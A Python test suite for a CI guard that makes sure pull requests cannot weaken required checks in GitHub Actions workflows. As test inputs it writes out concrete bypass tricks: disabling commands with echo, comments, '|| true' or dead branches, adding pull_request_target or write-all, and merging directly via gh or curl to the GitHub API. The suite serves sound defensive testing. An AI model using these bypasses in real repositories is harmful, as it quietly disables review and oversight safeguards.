#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""可信基线 guard 的测试（临时 git 仓库；不触碰真实仓库/网络）。

覆盖：必需检查被删除 / 来源绑定被削弱 / job 删除或改名 / 必需 job 新增可跳过的 if /
新增 workflow_dispatch / 新增提权触发 / 新增直推 main / 测试删除或数量缩小 /
旧直推 workflow 被重新武装，以及 base 版本 guard 对候选树的实际判定。
"""
import json
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts" / "ci"))

import verify_policy_baseline as bl  # noqa: E402

NAMES = ["general-pr-verify", "workflow-policy-guard", "trusted-baseline-guard"]

MANIFEST = {
    "schema": "mihomo-rules-required-checks", "version": 2,
    "workflow": ".github/workflows/pr-verify.yml",
    "checks": [{"name": n, "job_id": n, "workflow": ".github/workflows/pr-verify.yml",
                "source": {"app_slug": "github-actions", "app_id": 15368}} for n in NAMES],
}

_RESOLVER_RUN = """      - name: exe
        run: |
          set -euo pipefail
          unset -f python3 python pip pip3 git grep cat test printf readlink cp mv ln install chmod 2>/dev/null || true
          unset BASH_ENV ENV || true
          _resolve() {
            local name="$1" path
            path="$(command -v -- "$name" 2>/dev/null || true)"
            case "$path" in
              /usr/*|/bin/*|/opt/*) ;;
              *) echo "bad $name"; exit 1 ;;
            esac
            test -x "$path" || exit 1
            readlink -f -- "$path"
          }
          PY_BIN="$(_resolve python3)"
          GIT_BIN="$(_resolve git)"
          test -n "$("$PY_BIN" -c 'import sys; print(sys.version_info[0])')"
          test -n "$("$GIT_BIN" --version)"
          {
            echo "PY_BIN=$PY_BIN"
            echo "GIT_BIN=$GIT_BIN"
          } >> "$GITHUB_ENV"
"""

PR_VERIFY = """name: General PR verification
on:
  pull_request:
    branches:
      - main
permissions:
  contents: read
jobs:
  general-pr-verify:
    name: general-pr-verify
    runs-on: ubuntu-latest
    steps:
      - name: sha
        run: |
          set -euo pipefail
          printf '%s' "a" | grep -Eq '^[0-9a-f]{40}$' || { echo bad; exit 1; }
      - uses: actions/checkout@v7
        with:
          ref: ${{ steps.pr.outputs.head }}
          persist-credentials: false
      - uses: actions/checkout@v7
        with:
          repository: Hawaiine/Oasisic-Icons
          ref: f0f3bc2a44616885682ee5f0e5921540b964e2d8
          path: Oasisic-Icons
          persist-credentials: false
""" + _RESOLVER_RUN + """      - run: '"$PY_BIN" -m pip install pyyaml'
      - name: guard
        env:
          MIHOMO_ICON_REPO: ${{ github.workspace }}/Oasisic-Icons
        run: '"$PY_BIN" scripts/ci/verify_general_pr.py'
      - name: configs
        env:
          MIHOMO_ICON_REPO: ${{ github.workspace }}/Oasisic-Icons
        run: '"$PY_BIN" scripts/verify_configs.py'
      - run: '"$PY_BIN" scripts/verify_rulesets.py'
      - run: '"$PY_BIN" scripts/icon_urls.py'
      - run: '"$PY_BIN" scripts/readme_stats.py --check'
      - name: tests
        env:
          MIHOMO_ICON_REPO: ${{ github.workspace }}/Oasisic-Icons
        run: '"$PY_BIN" -m unittest discover -s scripts/tests'
  workflow-policy-guard:
    name: workflow-policy-guard
    runs-on: ubuntu-latest
    steps:
      - name: sha
        run: printf '%s' "a" | grep -Eq '^[0-9a-f]{40}$'
      - uses: actions/checkout@v7
        with:
          ref: ${{ steps.pr.outputs.head }}
          persist-credentials: false
""" + _RESOLVER_RUN + """      - run: '"$PY_BIN" -m pip install pyyaml'
      - name: policy
        run: |
          "$PY_BIN" scripts/ci/verify_workflow_policy.py --json "$RUNNER_TEMP/workflow-policy.json"
          test -s "$RUNNER_TEMP/workflow-policy.json"
          "$PY_BIN" -c 'import json,sys; d=json.load(open(sys.argv[1],encoding="utf-8")); assert d["ok"] is True, d' "$RUNNER_TEMP/workflow-policy.json"
  trusted-baseline-guard:
    name: trusted-baseline-guard
    runs-on: ubuntu-latest
    steps:
      - name: sha
        run: printf '%s' "a" | grep -Eq '^[0-9a-f]{40}$'
      - uses: actions/checkout@v7
        with:
          ref: ${{ steps.pr.outputs.head }}
          persist-credentials: false
""" + _RESOLVER_RUN + """      - run: '"$PY_BIN" -m pip install pyyaml'
      - name: basecheck
        run: |
          "$GIT_BIN" cat-file -e "${PR_BASE_SHA}^{commit}"
          "$GIT_BIN" cat-file -e "${PR_HEAD_SHA}^{commit}"
      - name: baseline
        run: |
          set -euo pipefail
          if "$GIT_BIN" cat-file -e "${PR_BASE_SHA}:scripts/ci/verify_policy_baseline.py" 2>/dev/null; then
            "$GIT_BIN" show "${PR_BASE_SHA}:scripts/ci/verify_policy_baseline.py" > "$RUNNER_TEMP/verify_policy_baseline.py"
            WANT="$("$GIT_BIN" rev-parse "${PR_BASE_SHA}:scripts/ci/verify_policy_baseline.py")"
          else
            "$GIT_BIN" show "${PR_HEAD_SHA}:scripts/ci/verify_policy_baseline.py" > "$RUNNER_TEMP/verify_policy_baseline.py"
            WANT="$("$GIT_BIN" rev-parse "${PR_HEAD_SHA}:scripts/ci/verify_policy_baseline.py")"
          fi
          test -s "$RUNNER_TEMP/verify_policy_baseline.py"
          test "$("$GIT_BIN" hash-object "$RUNNER_TEMP/verify_policy_baseline.py")" = "$WANT"
          grep -q -- "--base-sha" "$RUNNER_TEMP/verify_policy_baseline.py"
          grep -q -- "def main(" "$RUNNER_TEMP/verify_policy_baseline.py"
          "$PY_BIN" "$RUNNER_TEMP/verify_policy_baseline.py" --base-sha "${PR_BASE_SHA}" --head-sha "${PR_HEAD_SHA}" --repo-root . --json "$RUNNER_TEMP/trusted-baseline.json"
          test -s "$RUNNER_TEMP/trusted-baseline.json"
          "$PY_BIN" -c 'import json,sys; d=json.load(open(sys.argv[1],encoding="utf-8")); assert d["ok"] is True, d; assert d["base_sha"] and d["head_sha"], d' "$RUNNER_TEMP/trusted-baseline.json"
"""

# 夹具使用**真实的** daily-sync.yml 内容（若可用），使 base-guard 端到端判定只针对被测改动。
_REAL_LEGACY = ROOT / ".github" / "workflows" / "daily-sync.yml"
LEGACY = (_REAL_LEGACY.read_text(encoding="utf-8") if _REAL_LEGACY.exists() else "") or """name: daily sync
on:
  schedule:
    - cron: '0 22 * * *'
permissions:
  contents: write
jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - run: git push origin HEAD:${{ github.ref_name }}
"""

SAMPLE_TEST = "def test_one():\n    assert True\n\n\ndef test_two():\n    assert True\n\n\ndef test_three():\n    assert True\n"


def git(args, cwd):
    proc = subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True)
    if proc.returncode != 0:
        raise AssertionError(f"git {' '.join(args)}: {proc.stderr}")
    return proc.stdout


CANDIDATE = """name: candidate sync
on:
  schedule:
    - cron: '45 22 * * *'
permissions:
  contents: read
jobs:
  request-auto-merge:
    name: request-auto-merge
    if: vars.CANDIDATE_SYNC_ENABLED == 'true' && vars.CANDIDATE_AUTOMERGE_ENABLED == 'true'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
      checks: read
      actions: read
    steps:
      - uses: actions/checkout@v7
        with:
          ref: main
          persist-credentials: false
      - name: wait
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: python3 scripts/ci/await_checks.py --repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" --expected-head-sha "${{ needs.publish.outputs.head_sha }}" --base-branch "$BASE_BRANCH" --timeout 900 --interval 15 --max-interval 60 --json "$RUNNER_TEMP/await-checks.json"
      - name: verify
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: python3 scripts/ci/verify_required_checks.py --repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" --head-sha "${{ needs.publish.outputs.head_sha }}" --json "$RUNNER_TEMP/required-checks.json"
      - name: automerge
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: python3 scripts/ci/request_automerge.py --repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" --head-sha "${{ needs.publish.outputs.head_sha }}" --json "$RUNNER_TEMP/automerge.json"
"""
CAND_PATH = ".github/workflows/candidate-pr-sync.yml"
_AWAIT_ARGS = ('--repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" '
               '--expected-head-sha "${{ needs.publish.outputs.head_sha }}" --base-branch "$BASE_BRANCH" '
               '--timeout 900 --interval 15 --max-interval 60 --json "$RUNNER_TEMP/await-checks.json"')
_VERIFY_ARGS = ('--repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" '
                '--head-sha "${{ needs.publish.outputs.head_sha }}" '
                '--json "$RUNNER_TEMP/required-checks.json"')
_AM_ARGS = ('--repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" '
            '--head-sha "${{ needs.publish.outputs.head_sha }}" --json "$RUNNER_TEMP/automerge.json"')
AWAIT_STEP = ("      - name: wait\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
              "        run: python3 scripts/ci/await_checks.py " + _AWAIT_ARGS + "\n")
VERIFY_STEP = ("      - name: verify\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
               "        run: python3 scripts/ci/verify_required_checks.py " + _VERIFY_ARGS + "\n")
AUTOMERGE_STEP = ("      - name: automerge\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
                  "        run: python3 scripts/ci/request_automerge.py " + _AM_ARGS + "\n")


def block(prefix: str, body_lines: list[str]) -> str:
    """把单行命令改写成多行 shell 块（保持 YAML 合法）。"""
    if "run:" in prefix:
        head, ind = prefix.rstrip() + " |", " " * (len(prefix) + 2)
    else:
        head, ind = None, prefix
    return "\n".join(([head] if head else []) + [ind + ln for ln in body_lines])


class Fixture(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.root = Path(self.tmp)
        git(["init", "-q", "-b", "main"], self.root)
        git(["config", "user.email", "t@example.invalid"], self.root)
        git(["config", "user.name", "t"], self.root)
        (self.root / ".github" / "workflows").mkdir(parents=True)
        (self.root / "scripts" / "ci").mkdir(parents=True)
        (self.root / "scripts" / "tests").mkdir(parents=True)
        self.write({".github/required-checks.json": json.dumps(MANIFEST, ensure_ascii=False, indent=2),
                    ".github/workflows/pr-verify.yml": PR_VERIFY,
                    ".github/workflows/candidate-pr-sync.yml": CANDIDATE,
                    ".github/workflows/daily-sync.yml": LEGACY,
                    "scripts/tests/test_sample.py": SAMPLE_TEST,
                    "scripts/ci/verify_workflow_policy.py": (ROOT / "scripts" / "ci" / "verify_workflow_policy.py").read_text(encoding="utf-8"),
                    "README.md": "base\n"})
        self.base = self.commit("base")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def write(self, files: dict[str, str | None]):
        for rel, content in files.items():
            path = self.root / rel
            if content is None:
                path.unlink(missing_ok=True)
                continue
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")

    def commit(self, message: str) -> str:
        git(["add", "-A"], self.root)
        git(["commit", "-q", "-m", message], self.root)
        return git(["rev-parse", "HEAD"], self.root).strip()

    def problems_after(self, files: dict[str, str | None]) -> list[str]:
        self.write(files)
        head = self.commit("change")
        return bl.weakening_problems(self.base, head, self.root)

    def assertProblem(self, needle: str, files: dict[str, str | None]):
        problems = self.problems_after(files)
        self.assertTrue(any(needle in p for p in problems), f"未命中 {needle!r}：{problems}")
        return problems


class WeakeningTest(Fixture):
    def test_benign_change_has_no_problems(self):
        self.assertEqual(self.problems_after({"README.md": "base\nmore\n"}), [])

    def test_required_check_removed(self):
        manifest = json.loads(json.dumps(MANIFEST))
        manifest["checks"] = manifest["checks"][:2]
        self.assertProblem("removed", {".github/required-checks.json": json.dumps(manifest)})

    def test_source_binding_changed(self):
        manifest = json.loads(json.dumps(MANIFEST))
        manifest["checks"][0]["source"]["app_id"] = 1
        self.assertProblem("预期来源被改变", {".github/required-checks.json": json.dumps(manifest)})

    def test_source_binding_removed(self):
        manifest = json.loads(json.dumps(MANIFEST))
        manifest["checks"] = NAMES
        self.assertProblem("预期来源被改变", {".github/required-checks.json": json.dumps(manifest)})

    def test_manifest_deleted(self):
        self.assertProblem("must not disappear", {".github/required-checks.json": None})

    def test_job_removed(self):
        start = PR_VERIFY.index("  trusted-baseline-guard:")
        end = PR_VERIFY.index("      - name: baseline")
        end = PR_VERIFY.index("\n", PR_VERIFY.index(BASELINE_CMD_BODY, end)) + 1
        self.assertProblem("job 'trusted-baseline-guard' removed",
                           {".github/workflows/pr-verify.yml": PR_VERIFY[:start] + PR_VERIFY[end:]})

    def test_job_name_changed(self):
        self.assertProblem("name changed",
                           {".github/workflows/pr-verify.yml": PR_VERIFY.replace(
                               "  general-pr-verify:\n    name: general-pr-verify",
                               "  general-pr-verify:\n    name: general-verify-renamed")})

    def test_job_gains_skippable_if(self):
        self.assertProblem("新增 job-level if", {".github/workflows/pr-verify.yml": PR_VERIFY.replace(
            "  workflow-policy-guard:\n    name: workflow-policy-guard\n",
            "  workflow-policy-guard:\n    name: workflow-policy-guard\n    if: false\n")})

    def test_workflow_dispatch_added(self):
        self.assertProblem("新增 workflow_dispatch", {".github/workflows/pr-verify.yml": PR_VERIFY.replace(
            "on:\n  pull_request:\n", "on:\n  workflow_dispatch:\n  pull_request:\n")})

    def test_write_all_added(self):
        self.assertProblem("write-all", {".github/workflows/pr-verify.yml": PR_VERIFY.replace(
            "permissions:\n  contents: read\n", "permissions: write-all\n")})

    def test_pull_request_target_added(self):
        self.assertProblem("pull_request_target", {".github/workflows/pr-verify.yml": PR_VERIFY.replace(
            "on:\n  pull_request:\n", "on:\n  pull_request_target:\n")})

    def test_push_to_main_added(self):
        self.assertProblem("adds a push to main", {".github/workflows/pr-verify.yml": PR_VERIFY.replace(
            "        run: '\"$PY_BIN\" scripts/ci/verify_general_pr.py'",
            "        run: git push origin main\n      - name: guard\n"
            "        run: '\"$PY_BIN\" scripts/ci/verify_general_pr.py'")})

    def test_legacy_direct_write_rearmed(self):
        """Route A：重新引入写操作才算重新武装（注释/委派不算）。"""
        self.assertProblem("legacy direct-write workflow",
                           {".github/workflows/daily-sync.yml":
                            LEGACY + "\n      - run: git push origin HEAD:main\n"})

    def test_legacy_delegation_without_writes_is_allowed(self):
        problems = self.problems_after({".github/workflows/daily-sync.yml": LEGACY + "\n# 注释变更\n"})
        self.assertFalse([p for p in problems if "legacy direct-write" in p], problems)

    def test_test_file_deleted(self):
        self.assertProblem("test files deleted", {"scripts/tests/test_sample.py": None})

    def test_test_count_shrunk(self):
        self.assertProblem("test case count shrank", {"scripts/tests/test_sample.py": "def test_one():\n    assert True\n"})

    def test_guard_invocation_removed(self):
        self.assertProblem("guard invocation", {".github/workflows/pr-verify.yml": PR_VERIFY.replace(
            "        run: '\"$PY_BIN\" scripts/ci/verify_general_pr.py'\n", "")})


class MainTest(Fixture):
    def test_main_ok_and_writes_json(self):
        self.write({"README.md": "base\nnoop\n"})
        head = self.commit("noop")
        out = self.root / "out.json"
        code = bl.main(["--base-sha", self.base, "--head-sha", head, "--repo-root", str(self.root),
                        "--json", str(out)])
        self.assertEqual(code, 0)
        data = json.loads(out.read_text(encoding="utf-8"))
        self.assertTrue(data["ok"])
        self.assertIn("base_guard_applied", data)

    def test_main_fails_on_weakening(self):
        self.write({".github/workflows/daily-sync.yml": LEGACY + "# tampered\n"})
        head = self.commit("weaken")
        code = bl.main(["--base-sha", self.base, "--head-sha", head, "--repo-root", str(self.root)])
        self.assertEqual(code, 1)

    def test_base_guard_rejects_non_compliant_candidate_tree(self):
        """base 版本 guard 判定候选树不合规（候选不得用自身新规则给自己放行）。"""
        self.write({".github/workflows/pr-verify.yml": PR_VERIFY.replace(
            "on:\n  pull_request:\n", "on:\n  workflow_dispatch:\n  pull_request:\n")})
        head = self.commit("add dispatch")
        out = self.root / "o.json"
        code = bl.main(["--base-sha", self.base, "--head-sha", head, "--repo-root", str(self.root),
                        "--json", str(out)])
        self.assertEqual(code, 1)
        data = json.loads(out.read_text(encoding="utf-8"))
        self.assertTrue(any("base 版本 guard 判定候选树不合规" in p for p in data["problems"]), data["problems"])

    def test_check_entries_parses_both_shapes(self):
        self.assertEqual(set(bl.check_entries(json.dumps(MANIFEST))), set(NAMES))
        self.assertEqual(set(bl.check_entries(json.dumps({"required": NAMES}))), set(NAMES))

    def test_unreadable_manifest_fails_closed(self):
        with self.assertRaises(bl.BaselineError):
            bl.check_entries("{not json")


if __name__ == "__main__":
    unittest.main()


# --------------------------------------------------------------------------- Fix B
POLICY_CMD_BODY = ('"$PY_BIN" scripts/ci/verify_workflow_policy.py '
                   '--json "$RUNNER_TEMP/workflow-policy.json"')
BASELINE_CMD_BODY = ('"$PY_BIN" "$RUNNER_TEMP/verify_policy_baseline.py" '
                     '--base-sha "${PR_BASE_SHA}" --head-sha "${PR_HEAD_SHA}" --repo-root . '
                     '--json "$RUNNER_TEMP/trusted-baseline.json"')
JOB_ORDER = ("general-pr-verify", "workflow-policy-guard", "trusted-baseline-guard")
JOB_PREFIX = {"general-pr-verify": "        run: ",
              "workflow-policy-guard": "          ",
              "trusted-baseline-guard": "          "}
JOB_WRAP = {"general-pr-verify": True,          # 普通标量 → 需要 YAML 单引号包裹
            "workflow-policy-guard": False,      # 已在块标量内
            "trusted-baseline-guard": False}
JOB_INNER = {"general-pr-verify": '"$PY_BIN" scripts/ci/verify_general_pr.py',
             "workflow-policy-guard": POLICY_CMD_BODY,
             "trusted-baseline-guard": BASELINE_CMD_BODY}


def yaml_scalar(cmd: str, wrap: bool) -> str:
    if not wrap:
        return cmd
    assert not cmd.startswith("'"), f"已包裹：{cmd!r}"
    return "'" + cmd + "'"


def job_cmd(job: str, inner: str) -> str:
    return JOB_PREFIX[job] + yaml_scalar(inner, JOB_WRAP[job])


JOB_COMMANDS = [(job, JOB_PREFIX[job], yaml_scalar(JOB_INNER[job], JOB_WRAP[job]))
                for job in JOB_ORDER]
CONFIGS_CMD = "run: " + yaml_scalar('"$PY_BIN" scripts/verify_configs.py', True)
UNITTEST_CMD = "run: " + yaml_scalar('"$PY_BIN" -m unittest discover -s scripts/tests', True)
PIP_CMD = "run: " + yaml_scalar('"$PY_BIN" -m pip install pyyaml', True)
JOBS_TARGET = {
    "general-pr-verify": "scripts/ci/verify_general_pr.py",
    "workflow-policy-guard": "scripts/ci/verify_workflow_policy.py",
    "trusted-baseline-guard": '"$RUNNER_TEMP/verify_policy_baseline.py"',
}
CATFILE_CMD = '"$GIT_BIN" cat-file -e "${PR_BASE_SHA}^{commit}"'


def swap(text: str, needle: str, replacement: str) -> str:
    assert needle in text, f"fixture 未命中：{needle!r}"
    return text.replace(needle, replacement)


class CommandContractInBaselineGuardTest(Fixture):
    """Fix B §4.3/§4.4：可信基线 guard 必须校验候选 workflow 的**实际执行命令**。

    该判定使用 guard 自带的**独立严格解析**（不 import 候选树代码），
    因此候选无法通过修改自己的 guard 来自证安全。
    """

    def expect_rejected(self, pr_verify: str, job: str):
        problems = self.problems_after({".github/workflows/pr-verify.yml": pr_verify})
        self.assertTrue(any("没有被真正执行" in p or "缺少必需命令" in p for p in problems),
                        f"{job}: {problems}")
        return problems

    def test_echo_not_executed_rejected_for_every_job(self):
        for job, prefix, body in JOB_COMMANDS:
            with self.subTest(job=job):
                repl = job_cmd(job, 'echo "NOT EXECUTED: ' + JOB_INNER[job] + '"')
                self.expect_rejected(swap(PR_VERIFY, prefix + body, repl), job)

    def test_command_in_comment_rejected(self):
        for job, prefix, body in JOB_COMMANDS:
            with self.subTest(job=job):
                self.expect_rejected(swap(PR_VERIFY, prefix + body,
                                          job_cmd(job, f"# {JOB_INNER[job]}")), job)

    def test_pipe_true_swallowing_rejected(self):
        for job, prefix, body in JOB_COMMANDS:
            with self.subTest(job=job):
                self.expect_rejected(swap(PR_VERIFY, prefix + body,
                                          job_cmd(job, JOB_INNER[job] + " || true")), job)

    def test_conditional_branch_rejected(self):
        pr_verify = swap(PR_VERIFY, job_cmd("general-pr-verify", JOB_INNER["general-pr-verify"]),
                         "        run: " + yaml_scalar('if false; then "$PY_BIN" '
                                                   'scripts/ci/verify_general_pr.py; fi', True))
        self.expect_rejected(pr_verify, "general-pr-verify")

    def test_heredoc_hidden_command_rejected(self):
        body = JOB_COMMANDS[2][2]
        pr_verify = swap(PR_VERIFY, "          " + body,
                         "          cat <<'EOF' > /tmp/x\n          " + body + "\n          EOF")
        self.expect_rejected(pr_verify, "trusted-baseline-guard")

    def test_fake_step_name_without_execution_rejected(self):
        pr_verify = swap(PR_VERIFY, job_cmd("workflow-policy-guard", POLICY_CMD_BODY),
                         "      - name: 🔐 workflow 策略 guard（结构化）\n        run: echo ok")
        problems = self.problems_after({".github/workflows/pr-verify.yml": pr_verify})
        self.assertTrue(any("缺少必需命令" in p for p in problems), problems)

    def test_missing_required_command_rejected(self):
        pr_verify = swap(PR_VERIFY, CONFIGS_CMD, "run: echo skipped")
        problems = self.problems_after({".github/workflows/pr-verify.yml": pr_verify})
        self.assertTrue(any("verify_configs.py" in p for p in problems), problems)

    def test_unittest_noop_rejected(self):
        pr_verify = swap(PR_VERIFY, UNITTEST_CMD,
                         "run: " + yaml_scalar('echo "$PY_BIN -m unittest discover '
                                               '-s scripts/tests"', True))
        problems = self.problems_after({".github/workflows/pr-verify.yml": pr_verify})
        self.assertTrue(any("unittest" in p for p in problems), problems)

    def test_dependency_install_noop_rejected(self):
        pr_verify = swap(PR_VERIFY, PIP_CMD,
                         "run: " + yaml_scalar('echo "$PY_BIN -m pip install pyyaml"', True))
        problems = self.problems_after({".github/workflows/pr-verify.yml": pr_verify})
        self.assertTrue(any("pip install pyyaml" in p for p in problems), problems)

    def test_base_availability_check_removed_rejected(self):
        pr_verify = swap(PR_VERIFY, CATFILE_CMD, "true")
        problems = self.problems_after({".github/workflows/pr-verify.yml": pr_verify})
        self.assertTrue(any("cat-file" in p for p in problems), problems)

    def test_baseline_missing_base_sha_flag_rejected(self):
        pr_verify = swap(PR_VERIFY, "--base-sha", "--bogus")
        problems = self.problems_after({".github/workflows/pr-verify.yml": pr_verify})
        self.assertTrue(any("verify_policy_baseline.py" in p for p in problems), problems)

    def test_contract_parser_is_independent_of_candidate_code(self):
        """guard 自带解析实现，不 import 候选树模块（候选无法自证安全）。"""
        src = (ROOT / "scripts" / "ci" / "verify_policy_baseline.py").read_text(encoding="utf-8")
        self.assertNotIn("import workflow_command_contract", src)
        self.assertNotIn("from workflow_command_contract", src)
        self.assertTrue(hasattr(bl, "check_command_contract"))
        self.assertTrue(hasattr(bl, "executed_commands"))

    def test_benign_readme_change_still_passes(self):
        self.assertEqual(self.problems_after({"README.md": "base\nmore\n"}), [])

    def test_real_pr_verify_passes_contract(self):
        real = (ROOT / ".github" / "workflows" / "pr-verify.yml").read_text(encoding="utf-8")
        import yaml
        self.assertEqual(bl.check_command_contract(yaml.safe_load(real)), [])


# ------------------------------------------------------------------ Fix A3（第四轮）
class CommandExecutionProofInBaselineTest(Fixture):
    """Fix A3：可信基线 guard 的**独立实现**必须拒绝同样的执行语义绕过。"""

    def expect_rejected(self, text: str, label: str):
        problems = self.problems_after({".github/workflows/pr-verify.yml": text})
        self.assertTrue(any("没有被真正执行" in p or "缺少必需命令" in p for p in problems),
                        f"{label}: {problems}")
        return problems

    def test_py_compile_substitution_rejected_for_every_job(self):
        for job, prefix, body in JOB_COMMANDS:
            with self.subTest(job=job):
                repl = job_cmd(job, '"$PY_BIN" -m py_compile ' + JOBS_TARGET[job])
                self.expect_rejected(swap(PR_VERIFY, prefix + body, repl), job)

    def test_inline_c_substitution_rejected_for_every_job(self):
        for job, prefix, body in JOB_COMMANDS:
            with self.subTest(job=job):
                repl = job_cmd(job, '"$PY_BIN" -c print(1) ' + JOBS_TARGET[job])
                self.expect_rejected(swap(PR_VERIFY, prefix + body, repl), job)

    def test_cross_line_if_false_rejected_for_every_job(self):
        for job, prefix, body in JOB_COMMANDS:
            with self.subTest(job=job):
                self.expect_rejected(swap(PR_VERIFY, prefix + body,
                                          block(prefix, ["if false; then",
                                                         "  " + JOB_INNER[job], "fi"])), job)

    def test_uncalled_function_rejected_for_every_job(self):
        for job, prefix, body in JOB_COMMANDS:
            with self.subTest(job=job):
                self.expect_rejected(swap(PR_VERIFY, prefix + body,
                                          block(prefix, ["g() {", "  " + JOB_INNER[job], "}"])), job)

    def test_case_branch_rejected(self):
        for job, prefix, body in JOB_COMMANDS:
            with self.subTest(job=job):
                self.expect_rejected(swap(PR_VERIFY, prefix + body,
                                          block(prefix, ["case \"$X\" in",
                                                         "  a) " + JOB_INNER[job] + " ;;",
                                                         "esac"])), job)

    def test_for_loop_rejected(self):
        for job, prefix, body in JOB_COMMANDS:
            with self.subTest(job=job):
                self.expect_rejected(swap(PR_VERIFY, prefix + body,
                                          block(prefix, ["for i in 1; do",
                                                         "  " + JOB_INNER[job], "done"])), job)

    def test_subshell_rejected(self):
        for job, prefix, body in JOB_COMMANDS:
            with self.subTest(job=job):
                self.expect_rejected(swap(PR_VERIFY, prefix + body,
                                          block(prefix, ["(", "  " + JOB_INNER[job], ")"])), job)

    def test_brace_group_rejected(self):
        job = "trusted-baseline-guard"
        prefix, body = JOB_PREFIX[job], yaml_scalar(JOB_INNER[job], JOB_WRAP[job])
        self.expect_rejected(swap(PR_VERIFY, prefix + body,
                                  prefix + "{ " + JOB_INNER[job] + "; }"), job)

    def test_real_layout_passes(self):
        self.assertEqual(self.problems_after({"README.md": "base\nmore\n"}), [])


# ------------------------------------------------------------------ Fix B4/B5（第四轮）
class AutoMergeContractInBaselineTest(Fixture):
    """Fix B4/B5：基线 guard 必须独立拒绝 echo 化前置命令与直接 mutation。"""

    def candidate_problems(self, text: str) -> list[str]:
        return self.problems_after({CAND_PATH: text})

    def test_helper_echoed_rejected(self):
        for label, step in (("await_checks.py", AWAIT_STEP), ("verify_required_checks.py", VERIFY_STEP),
                            ("request_automerge.py", AUTOMERGE_STEP)):
            with self.subTest(helper=label):
                tail = step.split("        run: python3 scripts/ci/" + label + " ", 1)[1].strip()
                repl = ("      - name: x\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
                        "        run: |\n          echo \"NOT EXECUTED: " + label + "\" " + tail + "\n")
                problems = self.candidate_problems(CANDIDATE.replace(step, repl))
                self.assertTrue(any("没有被实际执行" in p or "缺少必需命令" in p for p in problems), problems)

    def test_helper_in_if_false_rejected(self):
        body = "python3 scripts/ci/request_automerge.py " + _AM_ARGS
        repl = ("      - name: automerge\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
                "        run: |\n          if false; then\n            " + body + "\n          fi\n")
        problems = self.candidate_problems(CANDIDATE.replace(AUTOMERGE_STEP, repl))
        self.assertTrue(any("没有被实际执行" in p for p in problems), problems)

    def test_direct_gh_api_graphql_rejected(self):
        text = CANDIDATE.replace(
            "        run: python3 scripts/ci/request_automerge.py " + _AM_ARGS,
            "        run: |\n          gh api graphql -f query='mutation{enablePullRequestAutoMerge}'\n"
            "          python3 scripts/ci/request_automerge.py " + _AM_ARGS)
        problems = self.candidate_problems(text)
        self.assertTrue(any("直接 auto-merge mutation 标记" in p for p in problems), problems)

    def test_direct_rest_merge_rejected(self):
        text = CANDIDATE.replace(
            "        run: python3 scripts/ci/request_automerge.py " + _AM_ARGS,
            "        run: |\n          curl -X PUT https://api.github.com/repos/o/r/pulls/1/merge\n"
            "          python3 scripts/ci/request_automerge.py " + _AM_ARGS)
        problems = self.candidate_problems(text)
        self.assertTrue(any("REST merge 端点" in p for p in problems), problems)

    def test_gh_pr_merge_rejected(self):
        text = CANDIDATE.replace(
            "        run: python3 scripts/ci/request_automerge.py " + _AM_ARGS,
            "        run: |\n          gh pr merge 1 --squash\n"
            "          python3 scripts/ci/request_automerge.py " + _AM_ARGS)
        problems = self.candidate_problems(text)
        self.assertTrue(any("gh pr merge" in p for p in problems), problems)

    def test_curl_graphql_rejected(self):
        text = CANDIDATE.replace(
            "        run: python3 scripts/ci/request_automerge.py " + _AM_ARGS,
            "        run: |\n          curl -sS https://api.github.com/graphql -d @payload.json\n"
            "          python3 scripts/ci/request_automerge.py " + _AM_ARGS)
        problems = self.candidate_problems(text)
        self.assertTrue(any("HTTP 客户端直接发 GraphQL" in p for p in problems), problems)

    def test_missing_helper_rejected(self):
        problems = self.candidate_problems(CANDIDATE.replace(AUTOMERGE_STEP, ""))
        self.assertTrue(any("request_automerge.py" in p for p in problems), problems)

    def test_real_candidate_passes(self):
        self.assertEqual(self.problems_after({"README.md": "base\nmore\n"}), [])


# --------------------------------------------------------------------------- 第五轮 Fix A/B
MASQUERADE = "attacker-controlled"


class PathIdentityInBaselineTest(Fixture):
    """Fix A：baseline guard 的**独立实现**必须同样拒绝路径伪装。"""

    REQUIRED = [
        ("general-pr-verify", "scripts/ci/verify_general_pr.py"),
        ("general-pr-verify", "scripts/verify_configs.py"),
        ("general-pr-verify", "scripts/verify_rulesets.py"),
        ("general-pr-verify", "scripts/icon_urls.py"),
        ("general-pr-verify", "scripts/readme_stats.py"),
        ("workflow-policy-guard", "scripts/ci/verify_workflow_policy.py"),
        ("trusted-baseline-guard", "$RUNNER_TEMP/verify_policy_baseline.py"),
    ]

    def expect_rejected(self, text: str, label: str):
        problems = self.problems_after({".github/workflows/pr-verify.yml": text})
        self.assertTrue(any("路径身份不符" in p or "没有被真正执行" in p for p in problems),
                        f"{label}: {problems}")
        return problems

    def test_masquerade_path_rejected(self):
        for job, path in self.REQUIRED:
            with self.subTest(job=job, path=path):
                name = path.rsplit("/", 1)[-1]
